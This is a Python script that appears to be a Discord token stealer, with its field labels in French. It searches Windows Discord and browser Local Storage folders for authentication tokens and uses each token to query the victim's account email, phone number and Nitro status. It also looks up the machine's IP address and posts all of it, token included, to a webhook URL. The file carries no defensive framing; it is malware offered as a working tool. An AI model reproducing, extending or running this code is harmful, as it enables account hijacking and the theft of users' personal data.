# coding: utf-8
import re
import os
import json
import requests

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')


paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Google Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb',
    'Google Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb',
    'Google Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb',
    'Google Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb',
    'Google Chrome6': local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb',
    'Google Chrome7': local + '\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    'Brave1': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb',
    'Brave2': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Local Storage\\leveldb',
    'Brave3': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Local Storage\\leveldb',
    'Brave4': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Local Storage\\leveldb',
    'Brave5': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Local Storage\\leveldb',
    'Brave6': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 6\\Local Storage\\leveldb',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
    'Yandex1': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Local Storage\\leveldb',
    'Yandex2': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Local Storage\\leveldb',
    'Yandex3': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Local Storage\\leveldb',
    'Yandex4': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Local Storage\\leveldb',
    'Yandex5': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Local Storage\\leveldb',
    'Yandex6': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 6\\Local Storage\\leveldb'
}


def find_token(path):
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
                    list_tokens.append(token)
    
    return tokens

list_tokens = []
def grab_all(token):
    tokeninfo = requests.get('https://discord.com/api/v8/users/@me', headers={'authorization': token}).json()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'authorization': token})
    if r.status_code != 200:
        return
    ipinfo = requests.get('http://ip-api.com/json/').json()
    nitro_type = json.loads(r.content)
    try:
        nitro_type['premium_type']
    except Exception:
        dnitro = "Non"
    else:
        if nitro_type['premium_type'] == 1:
            dnitro = "Nitro Classic"
        elif nitro_type['premium_type'] == 2:
            dnitro = "Nitro Boost"
    payload = {
        "embeds": [{
            "author": {
                "name": f"{tokeninfo['username']}#{tokeninfo['discriminator']}",
                "icon_url": f"https://cdn.discordapp.com/avatars/{tokeninfo['id']}/{tokeninfo['avatar']}.jpg"
            },
            "fields": [{
                "name": "**Infos Discord**",
                "value": f"ID: {tokeninfo['id']}\nEmail: {tokeninfo['email']}\nNuméro de téléphone: {tokeninfo['phone']}\nNitro: {dnitro}\nToken: {token}"
            },
                    {
                "name": "**Autres infos**",
                "value": f"IP: {ipinfo['query']}"
            }]
        }]
    }
    requests.post(url, json=payload)

for platform_lol, path in paths.items():
    if not os.path.exists(path):
        continue

    tokens = find_token(path)
    if len(tokens) > 0:
        for token in tokens:
            grab_all(token)
